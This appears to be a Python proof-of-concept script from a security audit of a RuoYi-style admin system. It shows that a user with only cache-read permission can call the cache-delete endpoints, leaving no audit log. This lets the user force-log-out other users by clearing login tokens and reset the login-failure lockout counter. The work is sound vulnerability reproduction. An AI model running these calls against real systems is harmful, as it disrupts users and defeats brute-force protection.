#!/usr/bin/env python3
# A17 复现脚本：缓存监控删除端点仅凭读权限（monitor:cache:list）即可执行且不留审计日志——
# 低权用户可清空 login_tokens 强退在线用户、删 pwd_err_cnt 重置账号锁定保护。
# 用法: /home/irons/dev/tcms/venv/bin/python repro_A17.py
import json
import sys
import time
from pathlib import Path

sys.path.insert(0, "/home/irons/dev/ruoyi-regression")
import api

OUT = Path(__file__).resolve().parent
ROLE_KEY = "A17CACHE"
ROLE_NAME = "A17缓存只读"
ATK = "a17atk"
VIC = "a17vic"
PW = "Admin123456"


def shot(page, name):
    page.screenshot(path=str(OUT / name), full_page=False)
    print("shot:", name)


def cleanup(at):
    for u in (ATK, VIC):
        row = api.db("select user_id from sys_user where user_name=%s", (u,))
        if row:
            api.db("delete from sys_user_role where user_id=%s", (row[0]["user_id"],))
            api.db("delete from sys_user where user_id=%s", (row[0]["user_id"],))
    r = api.db("select role_id from sys_role where role_key=%s", (ROLE_KEY,))
    if r:
        api.db("delete from sys_role_menu where role_id=%s", (r[0]["role_id"],))
        api.db("delete from sys_role where role_id=%s", (r[0]["role_id"],))


def main():
    at = api.admin_token()
    cleanup(at)
    ev = {}

    # 1) 仅挂"缓存监控"菜单的角色 + 攻击者/受害者用户
    menu = api.db("select menu_id from sys_menu where perms=%s", ("monitor:cache:list",))
    assert menu, "缓存监控菜单不存在"
    h, r = api.post("/system/role", token=at, body={
        "roleName": ROLE_NAME, "roleKey": ROLE_KEY, "roleSort": "9",
        "status": "0", "dataScope": "1", "deptIds": [], "menuIds": [menu[0]["menu_id"]]})
    assert r.get("code") == 200, r
    rid = api.db("select role_id from sys_role where role_key=%s", (ROLE_KEY,))[0]["role_id"]
    for u, nick in ((ATK, "A17攻击者"), (VIC, "A17受害者")):
        h, r = api.post("/system/user", token=at, body={
            "deptId": 100, "userName": u, "nickName": nick, "password": PW,
            "status": "0", "roleIds": [rid]})
        assert r.get("code") == 200, r

    atk = api.login(ATK, PW)
    vic = api.login(VIC, PW)
    assert isinstance(atk, str) and isinstance(vic, str), (atk, vic)
    h, g = api.get("/getInfo", token=atk)
    ev["atk_permissions"] = g.get("permissions")  # 仅 monitor:cache:list

    # 2) 低权用户枚举全部缓存组与在线会话键
    h, r = api.get("/monitor/cache/getNames", token=atk)
    ev["cache_names"] = [n["cacheName"] for n in r.get("data", [])]
    h, r = api.get("/monitor/cache/getKeys/login_tokens:", token=atk)
    ev["login_token_keys_seen"] = len(r.get("data", []))

    # 3) 删除腿A：清空 login_tokens: → 受害者会话即死（强退）
    h, r = api.delete("/monitor/cache/clearCacheName/login_tokens:", token=atk)
    ev["clearCacheName_code"] = r.get("code")
    h, g = api.get("/getInfo", token=vic)
    ev["victim_getInfo_after"] = g.get("code")  # 401=被低权用户强退

    # 4) 审计缺口（操作日志异步落库，等 2.5s）；对照：参数新增当窗落日志
    time.sleep(2.5)
    ev["oper_log_clearCache_rows"] = api.db(
        "select count(*) c from sys_oper_log where method like '%%clearCache%%'")[0]["c"]
    api._TOKEN_CACHE.clear()
    at = api.admin_token()
    h, r = api.post("/system/config", token=at, body={
        "configName": "A17对照参数", "configKey": "a17.never.key", "configValue": "1",
        "configType": "N", "remark": ""})
    ev["config_add_code"] = r.get("code")
    time.sleep(2.5)
    ev["oper_log_config_add_rows"] = api.db(
        "select count(*) c from sys_oper_log where oper_url like '%%/system/config' "
        "and method like '%%Controller.add%%'")[0]["c"]

    # 5) 删除腿B：删任意键——登录失败锁定计数（账号锁定保护可被重置）
    bad = api.login(ATK, "Xx1234567890!")
    ev["bad_login_code"] = bad[1][1].get("code") if isinstance(bad, tuple) else "unexpected-ok"
    ev["pwd_err_cnt_after_fail"] = api.redis_get("pwd_err_cnt:" + ATK)
    atk2 = api.login(ATK, PW)
    h, r = api.delete("/monitor/cache/clearCacheKey/pwd_err_cnt:%s" % ATK, token=atk2)
    ev["clearCacheKey_code"] = r.get("code")
    ev["pwd_err_cnt_after_del"] = api.redis_get("pwd_err_cnt:" + ATK)

    # 6) 界面实拍：低权用户登录后缓存监控页可见全部缓存组与"清空"按钮
    from playwright.sync_api import sync_playwright
    with sync_playwright() as pw:
        b = pw.chromium.launch(headless=True)
        ctx = b.new_context(viewport={"width": 1440, "height": 900})
        pg = ctx.new_page()
        pg.set_default_timeout(20000)
        with pg.expect_response(lambda x: "/captchaImage" in x.url, timeout=20000) as cap_info:
            pg.goto("http://localhost:18091/login", wait_until="domcontentloaded")
        pg.wait_for_selector('input[placeholder="账号"]', timeout=15000)
        uuid = cap_info.value.json().get("uuid")
        ans = api.redis_get("captcha_codes:" + uuid)
        pg.fill('input[placeholder="账号"]', ATK)
        pg.fill('input[placeholder="密码"]', PW)
        pg.fill('input[placeholder="验证码"]', ans)
        pg.locator("button", has_text="登 录").first.click()
        pg.wait_for_url("**/index**", timeout=20000)
        pg.goto("http://localhost:18091/monitor/cache", wait_until="networkidle")
        pg.wait_for_timeout(2000)
        shot(pg, "a17_1_lowpriv_cache_page.png")
        b.close()

    cleanup(at)
    api.db("delete from sys_config where config_key='a17.never.key'")
    api.db("delete from sys_oper_log where oper_url like '%%/system/config' "
           "and method like '%%Controller.add%%' and oper_param like '%%a17.never.key%%'")
    with open(OUT / "a17_evidence.json", "w", encoding="utf-8") as f:
        json.dump(ev, f, ensure_ascii=False, indent=2)
    print("== evidence ==")
    print(json.dumps(ev, ensure_ascii=False, indent=2))
    return ev


if __name__ == "__main__":
    main()
